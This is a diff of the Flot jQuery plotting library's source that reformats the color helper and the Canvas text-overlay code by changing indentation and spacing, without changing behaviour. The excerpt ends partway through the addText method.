@@ -29,14 +29,14 @@ Licensed under the MIT license.
  * V. 1.1: Fix error handling so e.g. parsing an empty string does
  * produce a color rather than just crashing.
  */
-(function($){$.color={};$.color.make=function(r,g,b,a){var o={};o.r=r||0;o.g=g||0;o.b=b||0;o.a=a!=null?a:1;o.add=function(c,d){for(var i=0;i<c.length;++i)o[c.charAt(i)]+=d;return o.normalize()};o.scale=function(c,f){for(var i=0;i<c.length;++i)o[c.charAt(i)]*=f;return o.normalize()};o.toString=function(){if(o.a>=1){return"rgb("+[o.r,o.g,o.b].join(",")+")"}else{return"rgba("+[o.r,o.g,o.b,o.a].join(",")+")"}};o.normalize=function(){function clamp(min,value,max){return value<min?min:value>max?max:value}o.r=clamp(0,parseInt(o.r),255);o.g=clamp(0,parseInt(o.g),255);o.b=clamp(0,parseInt(o.b),255);o.a=clamp(0,o.a,1);return o};o.clone=function(){return $.color.make(o.r,o.b,o.g,o.a)};return o.normalize()};$.color.extract=function(elem,css){var c;do{c=elem.css(css).toLowerCase();if(c!=""&&c!="transparent")break;elem=elem.parent()}while(elem.length&&!$.nodeName(elem.get(0),"body"));if(c=="rgba(0, 0, 0, 0)")c="transparent";return $.color.parse(c)};$.color.parse=function(str){var res,m=$.color.make;if(res=/rgb\(\s*([0-9]{1,3})\s*,\s*([0-9]{1,3})\s*,\s*([0-9]{1,3})\s*\)/.exec(str))return m(parseInt(res[1],10),parseInt(res[2],10),parseInt(res[3],10));if(res=/rgba\(\s*([0-9]{1,3})\s*,\s*([0-9]{1,3})\s*,\s*([0-9]{1,3})\s*,\s*([0-9]+(?:\.[0-9]+)?)\s*\)/.exec(str))return m(parseInt(res[1],10),parseInt(res[2],10),parseInt(res[3],10),parseFloat(res[4]));if(res=/rgb\(\s*([0-9]+(?:\.[0-9]+)?)\%\s*,\s*([0-9]+(?:\.[0-9]+)?)\%\s*,\s*([0-9]+(?:\.[0-9]+)?)\%\s*\)/.exec(str))return m(parseFloat(res[1])*2.55,parseFloat(res[2])*2.55,parseFloat(res[3])*2.55);if(res=/rgba\(\s*([0-9]+(?:\.[0-9]+)?)\%\s*,\s*([0-9]+(?:\.[0-9]+)?)\%\s*,\s*([0-9]+(?:\.[0-9]+)?)\%\s*,\s*([0-9]+(?:\.[0-9]+)?)\s*\)/.exec(str))return m(parseFloat(res[1])*2.55,parseFloat(res[2])*2.55,parseFloat(res[3])*2.55,parseFloat(res[4]));if(res=/#([a-fA-F0-9]{2})([a-fA-F0-9]{2})([a-fA-F0-9]{2})/.exec(str))return m(parseInt(res[1],16),parseInt(res[2],16),parseInt(res[3],16));if(res=/#([a-fA-F0-9])([a-fA-F0-9])([a-fA-F0-9])/.exec(str))return m(parseInt(res[1]+res[1],16),parseInt(res[2]+res[2],16),parseInt(res[3]+res[3],16));var name=$.trim(str).toLowerCase();if(name=="transparent")return m(255,255,255,0);else{res=lookupColors[name]||[0,0,0];return m(res[0],res[1],res[2])}};var lookupColors={aqua:[0,255,255],azure:[240,255,255],beige:[245,245,220],black:[0,0,0],blue:[0,0,255],brown:[165,42,42],cyan:[0,255,255],darkblue:[0,0,139],darkcyan:[0,139,139],darkgrey:[169,169,169],darkgreen:[0,100,0],darkkhaki:[189,183,107],darkmagenta:[139,0,139],darkolivegreen:[85,107,47],darkorange:[255,140,0],darkorchid:[153,50,204],darkred:[139,0,0],darksalmon:[233,150,122],darkviolet:[148,0,211],fuchsia:[255,0,255],gold:[255,215,0],green:[0,128,0],indigo:[75,0,130],khaki:[240,230,140],lightblue:[173,216,230],lightcyan:[224,255,255],lightgreen:[144,238,144],lightgrey:[211,211,211],lightpink:[255,182,193],lightyellow:[255,255,224],lime:[0,255,0],magenta:[255,0,255],maroon:[128,0,0],navy:[0,0,128],olive:[128,128,0],orange:[255,165,0],pink:[255,192,203],purple:[128,0,128],violet:[128,0,128],red:[255,0,0],silver:[192,192,192],white:[255,255,255],yellow:[255,255,0]}})(jQuery);
+(function ($) { $.color = {}; $.color.make = function (r, g, b, a) { var o = {}; o.r = r || 0; o.g = g || 0; o.b = b || 0; o.a = a != null ? a : 1; o.add = function (c, d) { for (var i = 0; i < c.length; ++i)o[c.charAt(i)] += d; return o.normalize() }; o.scale = function (c, f) { for (var i = 0; i < c.length; ++i)o[c.charAt(i)] *= f; return o.normalize() }; o.toString = function () { if (o.a >= 1) { return "rgb(" + [o.r, o.g, o.b].join(",") + ")" } else { return "rgba(" + [o.r, o.g, o.b, o.a].join(",") + ")" } }; o.normalize = function () { function clamp(min, value, max) { return value < min ? min : value > max ? max : value } o.r = clamp(0, parseInt(o.r), 255); o.g = clamp(0, parseInt(o.g), 255); o.b = clamp(0, parseInt(o.b), 255); o.a = clamp(0, o.a, 1); return o }; o.clone = function () { return $.color.make(o.r, o.b, o.g, o.a) }; return o.normalize() }; $.color.extract = function (elem, css) { var c; do { c = elem.css(css).toLowerCase(); if (c != "" && c != "transparent") break; elem = elem.parent() } while (elem.length && !$.nodeName(elem.get(0), "body")); if (c == "rgba(0, 0, 0, 0)") c = "transparent"; return $.color.parse(c) }; $.color.parse = function (str) { var res, m = $.color.make; if (res = /rgb\(\s*([0-9]{1,3})\s*,\s*([0-9]{1,3})\s*,\s*([0-9]{1,3})\s*\)/.exec(str)) return m(parseInt(res[1], 10), parseInt(res[2], 10), parseInt(res[3], 10)); if (res = /rgba\(\s*([0-9]{1,3})\s*,\s*([0-9]{1,3})\s*,\s*([0-9]{1,3})\s*,\s*([0-9]+(?:\.[0-9]+)?)\s*\)/.exec(str)) return m(parseInt(res[1], 10), parseInt(res[2], 10), parseInt(res[3], 10), parseFloat(res[4])); if (res = /rgb\(\s*([0-9]+(?:\.[0-9]+)?)\%\s*,\s*([0-9]+(?:\.[0-9]+)?)\%\s*,\s*([0-9]+(?:\.[0-9]+)?)\%\s*\)/.exec(str)) return m(parseFloat(res[1]) * 2.55, parseFloat(res[2]) * 2.55, parseFloat(res[3]) * 2.55); if (res = /rgba\(\s*([0-9]+(?:\.[0-9]+)?)\%\s*,\s*([0-9]+(?:\.[0-9]+)?)\%\s*,\s*([0-9]+(?:\.[0-9]+)?)\%\s*,\s*([0-9]+(?:\.[0-9]+)?)\s*\)/.exec(str)) return m(parseFloat(res[1]) * 2.55, parseFloat(res[2]) * 2.55, parseFloat(res[3]) * 2.55, parseFloat(res[4])); if (res = /#([a-fA-F0-9]{2})([a-fA-F0-9]{2})([a-fA-F0-9]{2})/.exec(str)) return m(parseInt(res[1], 16), parseInt(res[2], 16), parseInt(res[3], 16)); if (res = /#([a-fA-F0-9])([a-fA-F0-9])([a-fA-F0-9])/.exec(str)) return m(parseInt(res[1] + res[1], 16), parseInt(res[2] + res[2], 16), parseInt(res[3] + res[3], 16)); var name = $.trim(str).toLowerCase(); if (name == "transparent") return m(255, 255, 255, 0); else { res = lookupColors[name] || [0, 0, 0]; return m(res[0], res[1], res[2]) } }; var lookupColors = { aqua: [0, 255, 255], azure: [240, 255, 255], beige: [245, 245, 220], black: [0, 0, 0], blue: [0, 0, 255], brown: [165, 42, 42], cyan: [0, 255, 255], darkblue: [0, 0, 139], darkcyan: [0, 139, 139], darkgrey: [169, 169, 169], darkgreen: [0, 100, 0], darkkhaki: [189, 183, 107], darkmagenta: [139, 0, 139], darkolivegreen: [85, 107, 47], darkorange: [255, 140, 0], darkorchid: [153, 50, 204], darkred: [139, 0, 0], darksalmon: [233, 150, 122], darkviolet: [148, 0, 211], fuchsia: [255, 0, 255], gold: [255, 215, 0], green: [0, 128, 0], indigo: [75, 0, 130], khaki: [240, 230, 140], lightblue: [173, 216, 230], lightcyan: [224, 255, 255], lightgreen: [144, 238, 144], lightgrey: [211, 211, 211], lightpink: [255, 182, 193], lightyellow: [255, 255, 224], lime: [0, 255, 0], magenta: [255, 0, 255], maroon: [128, 0, 0], navy: [0, 0, 128], olive: [128, 128, 0], orange: [255, 165, 0], pink: [255, 192, 203], purple: [128, 0, 128], violet: [128, 0, 128], red: [255, 0, 0], silver: [192, 192, 192], white: [255, 255, 255], yellow: [255, 255, 0] } })(jQuery);
 
 // the actual Flot code
-(function($) {
+(function ($) {
 
-	// Cache the prototype hasOwnProperty for faster access
+    // Cache the prototype hasOwnProperty for faster access
 
-	var hasOwnProperty = Object.prototype.hasOwnProperty;
+    var hasOwnProperty = Object.prototype.hasOwnProperty;
 
     // A shim to provide 'detach' to jQuery versions prior to 1.4.  Using a DOM
     // operation produces the same effect as detach, i.e. removing the element
@@ -45,465 +45,465 @@ Licensed under the MIT license.
     // Do not merge this into Flot 0.9, since it requires jQuery 1.4.4+.
 
     if (!$.fn.detach) {
-        $.fn.detach = function() {
-            return this.each(function() {
+        $.fn.detach = function () {
+            return this.each(function () {
                 if (this.parentNode) {
-                    this.parentNode.removeChild( this );
+                    this.parentNode.removeChild(this);
                 }
             });
         };
     }
 
-	///////////////////////////////////////////////////////////////////////////
-	// The Canvas object is a wrapper around an HTML5 <canvas> tag.
-	//
-	// @constructor
-	// @param {string} cls List of classes to apply to the canvas.
-	// @param {element} container Element onto which to append the canvas.
-	//
-	// Requiring a container is a little iffy, but unfortunately canvas
-	// operations don't work unless the canvas is attached to the DOM.
+    ///////////////////////////////////////////////////////////////////////////
+    // The Canvas object is a wrapper around an HTML5 <canvas> tag.
+    //
+    // @constructor
+    // @param {string} cls List of classes to apply to the canvas.
+    // @param {element} container Element onto which to append the canvas.
+    //
+    // Requiring a container is a little iffy, but unfortunately canvas
+    // operations don't work unless the canvas is attached to the DOM.
 
-	function Canvas(cls, container) {
+    function Canvas(cls, container) {
 
-		var element = container.children("." + cls)[0];
+        var element = container.children("." + cls)[0];
 
-		if (element == null) {
+        if (element == null) {
 
-			element = document.createElement("canvas");
-			element.className = cls;
+            element = document.createElement("canvas");
+            element.className = cls;
 
-			$(element).css({ direction: "ltr", position: "absolute", left: 0, top: 0 })
-				.appendTo(container);
+            $(element).css({ direction: "ltr", position: "absolute", left: 0, top: 0 })
+                .appendTo(container);
 
-			// If HTML5 Canvas isn't available, fall back to [Ex|Flash]canvas
+            // If HTML5 Canvas isn't available, fall back to [Ex|Flash]canvas
 
-			if (!element.getContext) {
-				if (window.G_vmlCanvasManager) {
-					element = window.G_vmlCanvasManager.initElement(element);
-				} else {
-					throw new Error("Canvas is not available. If you're using IE with a fall-back such as Excanvas, then there's either a mistake in your conditional include, or the page has no DOCTYPE and is rendering in Quirks Mode.");
-				}
-			}
-		}
+            if (!element.getContext) {
+                if (window.G_vmlCanvasManager) {
+                    element = window.G_vmlCanvasManager.initElement(element);
+                } else {
+                    throw new Error("Canvas is not available. If you're using IE with a fall-back such as Excanvas, then there's either a mistake in your conditional include, or the page has no DOCTYPE and is rendering in Quirks Mode.");
+                }
+            }
+        }
 
-		this.element = element;
+        this.element = element;
 
-		var context = this.context = element.getContext("2d");
+        var context = this.context = element.getContext("2d");
 
-		// Determine the screen's ratio of physical to device-independent
-		// pixels.  This is the ratio between the canvas width that the browser
-		// advertises and the number of pixels actually present in that space.
+        // Determine the screen's ratio of physical to device-independent
+        // pixels.  This is the ratio between the canvas width that the browser
+        // advertises and the number of pixels actually present in that space.
 
-		// The iPhone 4, for example, has a device-independent width of 320px,
-		// but its screen is actually 640px wide.  It therefore has a pixel
-		// ratio of 2, while most normal devices have a ratio of 1.
+        // The iPhone 4, for example, has a device-independent width of 320px,
+        // but its screen is actually 640px wide.  It therefore has a pixel
+        // ratio of 2, while most normal devices have a ratio of 1.
 
-		var devicePixelRatio = window.devicePixelRatio || 1,
-			backingStoreRatio =
-				context.webkitBackingStorePixelRatio ||
-				context.mozBackingStorePixelRatio ||
-				context.msBackingStorePixelRatio ||
-				context.oBackingStorePixelRatio ||
-				context.backingStorePixelRatio || 1;
+        var devicePixelRatio = window.devicePixelRatio || 1,
+            backingStoreRatio =
+                context.webkitBackingStorePixelRatio ||
+                context.mozBackingStorePixelRatio ||
+                context.msBackingStorePixelRatio ||
+                context.oBackingStorePixelRatio ||
+                context.backingStorePixelRatio || 1;
 
-		this.pixelRatio = devicePixelRatio / backingStoreRatio;
+        this.pixelRatio = devicePixelRatio / backingStoreRatio;
 
-		// Size the canvas to match the internal dimensions of its container
+        // Size the canvas to match the internal dimensions of its container
 
-		this.resize(container.width(), container.height());
+        this.resize(container.width(), container.height());
 
-		// Collection of HTML div layers for text overlaid onto the canvas
+        // Collection of HTML div layers for text overlaid onto the canvas
 
-		this.textContainer = null;
-		this.text = {};
+        this.textContainer = null;
+        this.text = {};
 
-		// Cache of text fragments and metrics, so we can avoid expensively
-		// re-calculating them when the plot is re-rendered in a loop.
+        // Cache of text fragments and metrics, so we can avoid expensively
+        // re-calculating them when the plot is re-rendered in a loop.
 
-		this._textCache = {};
-	}
+        this._textCache = {};
+    }
 
-	// Resizes the canvas to the given dimensions.
-	//
-	// @param {number} width New width of the canvas, in pixels.
-	// @param {number} width New height of the canvas, in pixels.
+    // Resizes the canvas to the given dimensions.
+    //
+    // @param {number} width New width of the canvas, in pixels.
+    // @param {number} width New height of the canvas, in pixels.
 
-	Canvas.prototype.resize = function(width, height) {
+    Canvas.prototype.resize = function (width, height) {
 
-		if (width <= 0 || height <= 0) {
-			throw new Error("Invalid dimensions for plot, width = " + width + ", height = " + height);
-		}
+        if (width <= 0 || height <= 0) {
+            throw new Error("Invalid dimensions for plot, width = " + width + ", height = " + height);
+        }
 
-		var element = this.element,
-			context = this.context,
-			pixelRatio = this.pixelRatio;
+        var element = this.element,
+            context = this.context,
+            pixelRatio = this.pixelRatio;
 
-		// Resize the canvas, increasing its density based on the display's
-		// pixel ratio; basically giving it more pixels without increasing the
-		// size of its element, to take advantage of the fact that retina
-		// displays have that many more pixels in the same advertised space.
+        // Resize the canvas, increasing its density based on the display's
+        // pixel ratio; basically giving it more pixels without increasing the
+        // size of its element, to take advantage of the fact that retina
+        // displays have that many more pixels in the same advertised space.
 
-		// Resizing should reset the state (excanvas seems to be buggy though)
+        // Resizing should reset the state (excanvas seems to be buggy though)
 
-		if (this.width != width) {
-			element.width = width * pixelRatio;
-			element.style.width = width + "px";
-			this.width = width;
-		}
+        if (this.width != width) {
+            element.width = width * pixelRatio;
+            element.style.width = width + "px";
+            this.width = width;
+        }
 
-		if (this.height != height) {
-			element.height = height * pixelRatio;
-			element.style.height = height + "px";
-			this.height = height;
-		}
-
-		// Save the context, so we can reset in case we get replotted.  The
-		// restore ensure that we're really back at the initial state, and
-		// should be safe even if we haven't saved the initial state yet.
-
-		context.restore();
-		context.save();
-
-		// Scale the coordinate space to match the display density; so even though we
-		// may have twice as many pixels, we still want lines and other drawing to
-		// appear at the same size; the extra pixels will just make them crisper.
-
-		context.scale(pixelRatio, pixelRatio);
-	};
-
-	// Clears the entire canvas area, not including any overlaid HTML text
-
-	Canvas.prototype.clear = function() {
-		this.context.clearRect(0, 0, this.width, this.height);
-	};
-
-	// Finishes rendering the canvas, including managing the text overlay.
-
-	Canvas.prototype.render = function() {
-
-		var cache = this._textCache;
-
-		// For each text layer, add elements marked as active that haven't
-		// already been rendered, and remove those that are no longer active.
-
-		for (var layerKey in cache) {
-			if (hasOwnProperty.call(cache, layerKey)) {
-
-				var layer = this.getTextLayer(layerKey),
-					layerCache = cache[layerKey];
-
-				layer.hide();
-
-				for (var styleKey in layerCache) {
-					if (hasOwnProperty.call(layerCache, styleKey)) {
-						var styleCache = layerCache[styleKey];
-						for (var key in styleCache) {
-							if (hasOwnProperty.call(styleCache, key)) {
-
-								var positions = styleCache[key].positions;
-
-								for (var i = 0, position; position = positions[i]; i++) {
-									if (position.active) {
-										if (!position.rendered) {
-											layer.append(position.element);
-											position.rendered = true;
-										}
-									} else {
-										positions.splice(i--, 1);
-										if (position.rendered) {
-											position.element.detach();
-										}
-									}
-								}
-
-								if (positions.length == 0) {
-									delete styleCache[key];
-								}
-							}
-						}
-					}
-				}
-
-				layer.show();
-			}
-		}
-	};
-
-	// Creates (if necessary) and returns the text overlay container.
-	//
-	// @param {string} classes String of space-separated CSS classes used to
-	//     uniquely identify the text layer.
-	// @return {object} The jQuery-wrapped text-layer div.
-
-	Canvas.prototype.getTextLayer = function(classes) {
-
-		var layer = this.text[classes];
-
-		// Create the text layer if it doesn't exist
-
-		if (layer == null) {
-
-			// Create the text layer container, if it doesn't exist
-
-			if (this.textContainer == null) {
-				this.textContainer = $("<div class='flot-text'></div>")
-					.css({
-						position: "absolute",
-						top: 0,
-						left: 0,
-						bottom: 0,
-						right: 0,
-						'font-size': "smaller",
-						color: "#545454"
-					})
-					.insertAfter(this.element);
-			}
-
-			layer = this.text[classes] = $("<div></div>")
-				.addClass(classes)
-				.css({
-					position: "absolute",
-					top: 0,
-					left: 0,
-					bottom: 0,
-					right: 0
-				})
-				.appendTo(this.textContainer);
-		}
-
-		return layer;
-	};
-
-	// Creates (if necessary) and returns a text info object.
-	//
-	// The object looks like this:
-	//
-	// {
-	//     width: Width of the text's wrapper div.
-	//     height: Height of the text's wrapper div.
-	//     element: The jQuery-wrapped HTML div containing the text.
-	//     positions: Array of positions at which this text is drawn.
-	// }
-	//
-	// The positions array contains objects that look like this:
-	//
-	// {
-	//     active: Flag indicating whether the text should be visible.
-	//     rendered: Flag indicating whether the text is currently visible.
-	//     element: The jQuery-wrapped HTML div containing the text.
-	//     x: X coordinate at which to draw the text.
-	//     y: Y coordinate at which to draw the text.
-	// }
-	//
-	// Each position after the first receives a clone of the original element.
-	//
-	// The idea is that that the width, height, and general 'identity' of the
-	// text is constant no matter where it is placed; the placements are a
-	// secondary property.
-	//
-	// Canvas maintains a cache of recently-used text info objects; getTextInfo
-	// either returns the cached element or creates a new entry.
-	//
-	// @param {string} layer A string of space-separated CSS classes uniquely
-	//     identifying the layer containing this text.
-	// @param {string} text Text string to retrieve info for.
-	// @param {(string|object)=} font Either a string of space-separated CSS
-	//     classes or a font-spec object, defining the text's font and style.
-	// @param {number=} angle Angle at which to rotate the text, in degrees.
-	//     Angle is currently unused, it will be implemented in the future.
-	// @param {number=} width Maximum width of the text before it wraps.
-	// @return {object} a text info object.
-
-	Canvas.prototype.getTextInfo = function(layer, text, font, angle, width) {
-
-		var textStyle, layerCache, styleCache, info;
-
-		// Cast the value to a string, in case we were given a number or such
-
-		text = "" + text;
-
-		// If the font is a font-spec object, generate a CSS font definition
-
-		if (typeof font === "object") {
-			textStyle = font.style + " " + font.variant + " " + font.weight + " " + font.size + "px/" + font.lineHeight + "px " + font.family;
-		} else {
-			textStyle = font;
-		}
-
-		// Retrieve (or create) the cache for the text's layer and styles
-
-		layerCache = this._textCache[layer];
-
-		if (layerCache == null) {
-			layerCache = this._textCache[layer] = {};
-		}
-
-		styleCache = layerCache[textStyle];
-
-		if (styleCache == null) {
-			styleCache = layerCache[textStyle] = {};
-		}
-
-		info = styleCache[text];
-
-		// If we can't find a matching element in our cache, create a new one
-
-		if (info == null) {
-
-			var element = $("<div></div>").html(text)
-				.css({
-					position: "absolute",
-					'max-width': width,
-					top: -9999
-				})
-				.appendTo(this.getTextLayer(layer));
-
-			if (typeof font === "object") {
-				element.css({
-					font: textStyle,
-					color: font.color
-				});
-			} else if (typeof font === "string") {
-				element.addClass(font);
-			}
-
-			info = styleCache[text] = {
-				width: element.outerWidth(true),
-				height: element.outerHeight(true),
-				element: element,
-				positions: []
-			};
-
-			element.detach();
-		}
-
-		return info;
-	};
-
-	// Adds a text string to the canvas text overlay.
-	//
-	// The text isn't drawn immediately; it is marked as rendering, which will
-	// result in its addition to the canvas on the next render pass.
-	//
-	// @param {string} layer A string of space-separated CSS classes uniquely
-	//     identifying the layer containing this text.
-	// @param {number} x X coordinate at which to draw the text.
-	// @param {number} y Y coordinate at which to draw the text.
-	// @param {string} text Text string to draw.
-	// @param {(string|object)=} font Either a string of space-separated CSS
-	//     classes or a font-spec object, defining the text's font and style.
-	// @param {number=} angle Angle at which to rotate the text, in degrees.
-	//     Angle is currently unused, it will be implemented in the future.
-	// @param {number=} width Maximum width of the text before it wraps.
-	// @param {string=} halign Horizontal alignment of the text; either "left",
-	//     "center" or "right".
-	// @param {string=} valign Vertical alignment of the text; either "top",
-	//     "middle" or "bottom".
-
-	Canvas.prototype.addText = function(layer, x, y, text, font, angle, width, halign, valign) {
-
-		var info = this.getTextInfo(layer, text, font, angle, width),
-			positions = info.positions;
-
-		// Tweak the div's position to match the text's alignment
-
-		if (halign == "center") {
-			x -= info.width / 2;
-		} else if (halign == "right") {
-			x -= info.width;
-		}
-
-		if (valign == "middle") {
-			y -= info.height / 2;
-		} else if (valign == "bottom") {
-			y -= info.height;
-		}
-
-		// Determine whether this text already exists at this position.
-		// If so, mark it for inclusion in the next render pass.
-
-		for (var i = 0, position; position = positions[i]; i++) {
-			if (position.x == x && position.y == y) {
-				position.active = true;
-				return;
-			}
-		}
-
-		// If the text doesn't exist at this position, create a new entry
-
-		// For the very first position we'll re-use the original element,
-		// while for subsequent ones we'll clone it.
-
-		position = {
-			active: true,
-			rendered: false,
-			element: positions.length ? info.element.clone() : info.element,
-			x: x,
-			y: y
-		};
-
-		positions.push(position);
-
-		// Move the element to its final position within the container
-
-		position.element.css({
-			top: Math.round(y),
-			left: Math.round(x),
-			'text-align': halign	// In case the text wraps
-		});
-	};
-
-	// Removes one or more text strings from the canvas text overlay.
-	//
-	// If no parameters are given, all text within the layer is removed.
-	//
-	// Note that the text is not immediately removed; it is simply marked as
-	// inactive, which will result in its removal on the next render pass.
-	// This avoids the performance penalty for 'clear and redraw' behavior,
-	// where we potentially get rid of all text on a layer, but will likely
-	// add back most or all of it later, as when redrawing axes, for example.
-	//
-	// @param {string} layer A string of space-separated CSS classes uniquely
-	//     identifying the layer containing this text.
-	// @param {number=} x X coordinate of the text.
-	// @param {number=} y Y coordinate of the text.
-	// @param {string=} text Text string to remove.
-	// @param {(string|object)=} font Either a string of space-separated CSS
-	//     classes or a font-spec object, defining the text's font and style.
-	// @param {number=} angle Angle at which the text is rotated, in degrees.
-	//     Angle is currently unused, it will be implemented in the future.
-
-	Canvas.prototype.removeText = function(layer, x, y, text, font, angle) {
-		if (text == null) {
-			var layerCache = this._textCache[layer];
-			if (layerCache != null) {
-				for (var styleKey in layerCache) {
-					if (hasOwnProperty.call(layerCache, styleKey)) {
-						var styleCache = layerCache[styleKey];
-						for (var key in styleCache) {
-							if (hasOwnProperty.call(styleCache, key)) {
-								var positions = styleCache[key].positions;
-								for (var i = 0, position; position = positions[i]; i++) {
-									position.active = false;
-								}
-							}
-						}
-					}
-				}
-			}
-		} else {
-			var positions = this.getTextInfo(layer, text, font, angle).positions;
-			for (var i = 0, position; position = positions[i]; i++) {
-				if (position.x == x && position.y == y) {
-					position.active = false;
-				}
-			}
-		}
-	};
-
-	///////////////////////////////////////////////////////////////////////////
-	// The top-level container for the entire plot.
+        if (this.height != height) {
+            element.height = height * pixelRatio;
+            element.style.height = height + "px";
+            this.height = height;
+        }
+
+        // Save the context, so we can reset in case we get replotted.  The
+        // restore ensure that we're really back at the initial state, and
+        // should be safe even if we haven't saved the initial state yet.
+
+        context.restore();
+        context.save();
+
+        // Scale the coordinate space to match the display density; so even though we
+        // may have twice as many pixels, we still want lines and other drawing to
+        // appear at the same size; the extra pixels will just make them crisper.
+
+        context.scale(pixelRatio, pixelRatio);
+    };
+
+    // Clears the entire canvas area, not including any overlaid HTML text
+
+    Canvas.prototype.clear = function () {
+        this.context.clearRect(0, 0, this.width, this.height);
+    };
+
+    // Finishes rendering the canvas, including managing the text overlay.
+
+    Canvas.prototype.render = function () {
+
+        var cache = this._textCache;
+
+        // For each text layer, add elements marked as active that haven't
+        // already been rendered, and remove those that are no longer active.
+
+        for (var layerKey in cache) {
+            if (hasOwnProperty.call(cache, layerKey)) {
+
+                var layer = this.getTextLayer(layerKey),
+                    layerCache = cache[layerKey];
+
+                layer.hide();
+
+                for (var styleKey in layerCache) {
+                    if (hasOwnProperty.call(layerCache, styleKey)) {
+                        var styleCache = layerCache[styleKey];
+                        for (var key in styleCache) {
+                            if (hasOwnProperty.call(styleCache, key)) {
+
+                                var positions = styleCache[key].positions;
+
+                                for (var i = 0, position; position = positions[i]; i++) {
+                                    if (position.active) {
+                                        if (!position.rendered) {
+                                            layer.append(position.element);
+                                            position.rendered = true;
+                                        }
+                                    } else {
+                                        positions.splice(i--, 1);
+                                        if (position.rendered) {
+                                            position.element.detach();
+                                        }
+                                    }
+                                }
+
+                                if (positions.length == 0) {
+                                    delete styleCache[key];
+                                }
+                            }
+                        }
+                    }
+                }
+
+                layer.show();
+            }
+        }
+    };
+
+    // Creates (if necessary) and returns the text overlay container.
+    //
+    // @param {string} classes String of space-separated CSS classes used to
+    //     uniquely identify the text layer.
+    // @return {object} The jQuery-wrapped text-layer div.
+
+    Canvas.prototype.getTextLayer = function (classes) {
+
+        var layer = this.text[classes];
+
+        // Create the text layer if it doesn't exist
+
+        if (layer == null) {
+
+            // Create the text layer container, if it doesn't exist
+
+            if (this.textContainer == null) {
+                this.textContainer = $("<div class='flot-text'></div>")
+                    .css({
+                        position: "absolute",
+                        top: 0,
+                        left: 0,
+                        bottom: 0,
+                        right: 0,
+                        'font-size': "smaller",
+                        color: "#545454"
+                    })
+                    .insertAfter(this.element);
+            }
+
+            layer = this.text[classes] = $("<div></div>")
+                .addClass(classes)
+                .css({
+                    position: "absolute",
+                    top: 0,
+                    left: 0,
+                    bottom: 0,
+                    right: 0
+                })
+                .appendTo(this.textContainer);
+        }
+
+        return layer;
+    };
+
+    // Creates (if necessary) and returns a text info object.
+    //
+    // The object looks like this:
+    //
+    // {
+    //     width: Width of the text's wrapper div.
+    //     height: Height of the text's wrapper div.
+    //     element: The jQuery-wrapped HTML div containing the text.
+    //     positions: Array of positions at which this text is drawn.
+    // }
+    //
+    // The positions array contains objects that look like this:
+    //
+    // {
+    //     active: Flag indicating whether the text should be visible.
+    //     rendered: Flag indicating whether the text is currently visible.
+    //     element: The jQuery-wrapped HTML div containing the text.
+    //     x: X coordinate at which to draw the text.
+    //     y: Y coordinate at which to draw the text.
+    // }
+    //
+    // Each position after the first receives a clone of the original element.
+    //
+    // The idea is that that the width, height, and general 'identity' of the
+    // text is constant no matter where it is placed; the placements are a
+    // secondary property.
+    //
+    // Canvas maintains a cache of recently-used text info objects; getTextInfo
+    // either returns the cached element or creates a new entry.
+    //
+    // @param {string} layer A string of space-separated CSS classes uniquely
+    //     identifying the layer containing this text.
+    // @param {string} text Text string to retrieve info for.
+    // @param {(string|object)=} font Either a string of space-separated CSS
+    //     classes or a font-spec object, defining the text's font and style.
+    // @param {number=} angle Angle at which to rotate the text, in degrees.
+    //     Angle is currently unused, it will be implemented in the future.
+    // @param {number=} width Maximum width of the text before it wraps.
+    // @return {object} a text info object.
+
+    Canvas.prototype.getTextInfo = function (layer, text, font, angle, width) {
+
+        var textStyle, layerCache, styleCache, info;
+
+        // Cast the value to a string, in case we were given a number or such
+
+        text = "" + text;
+
+        // If the font is a font-spec object, generate a CSS font definition
+
+        if (typeof font === "object") {
+            textStyle = font.style + " " + font.variant + " " + font.weight + " " + font.size + "px/" + font.lineHeight + "px " + font.family;
+        } else {
+            textStyle = font;
+        }
+
+        // Retrieve (or create) the cache for the text's layer and styles
+
+        layerCache = this._textCache[layer];
+
+        if (layerCache == null) {
+            layerCache = this._textCache[layer] = {};
+        }
+
+        styleCache = layerCache[textStyle];
+
+        if (styleCache == null) {
+            styleCache = layerCache[textStyle] = {};
+        }
+
+        info = styleCache[text];
+
+        // If we can't find a matching element in our cache, create a new one
+
+        if (info == null) {
+
+            var element = $("<div></div>").html(text)
+                .css({
+                    position: "absolute",
+                    'max-width': width,
+                    top: -9999
+                })
+                .appendTo(this.getTextLayer(layer));
+
+            if (typeof font === "object") {
+                element.css({
+                    font: textStyle,
+                    color: font.color
+                });
+            } else if (typeof font === "string") {
+                element.addClass(font);
+            }
+
+            info = styleCache[text] = {
+                width: element.outerWidth(true),
+                height: element.outerHeight(true),
+                element: element,
+                positions: []
+            };
+
+            element.detach();
+        }
+
+        return info;
+    };
+
+    // Adds a text string to the canvas text overlay.
+    //
+    // The text isn't drawn immediately; it is marked as rendering, which will
+    // result in its addition to the canvas on the next render pass.
+    //
+    // @param {string} layer A string of space-separated CSS classes uniquely
+    //     identifying the layer containing this text.
+    // @param {number} x X coordinate at which to draw the text.
+    // @param {number} y Y coordinate at which to draw the text.
+    // @param {string} text Text string to draw.
+    // @param {(string|object)=} font Either a string of space-separated CSS
+    //     classes or a font-spec object, defining the text's font and style.
+    // @param {number=} angle Angle at which to rotate the text, in degrees.
+    //     Angle is currently unused, it will be implemented in the future.
+    // @param {number=} width Maximum width of the text before it wraps.
+    // @param {string=} halign Horizontal alignment of the text; either "left",
+    //     "center" or "right".
+    // @param {string=} valign Vertical alignment of the text; either "top",
+    //     "middle" or "bottom".
+
+    Canvas.prototype.addText = function (layer, x, y, text, font, angle, width, halign, valign) {
+
+        var info = this.getTextInfo(layer, text, font, angle, width),
+            positions = info.positions;
+
+        // Tweak the div's position to match the text's alignment
+
+        if (halign == "center") {
+            x -= info.width / 2;
+        } else if (halign == "right") {
+            x -= info.width;
+        }
+
+        if (valign == "middle") {
+            y -= info.height / 2;
+        } else if (valign == "bottom") {
+            y -= info.height;
+        }
+
+        // Determine whether this text already exists at this position.
+        // If so, mark it for inclusion in the next render pass.
+
+        for (var i = 0, position; position = positions[i]; i++) {
+            if (position.x == x && position.y == y) {
+                position.active = true;
+                return;
+            }
+        }
+
+        // If the text doesn't exist at this position, create a new entry
+
+        // For the very first position we'll re-use the original element,
+        // while for subsequent ones we'll clone it.
+
+        position = {
+            active: true,
+            rendered: false,
+            element: positions.length ? info.element.clone() : info.element,
+            x: x,
+            y: y
+        };
+
+        positions.push(position);
+
+        // Move the element to its final position within the container
+
+        position.element.css({
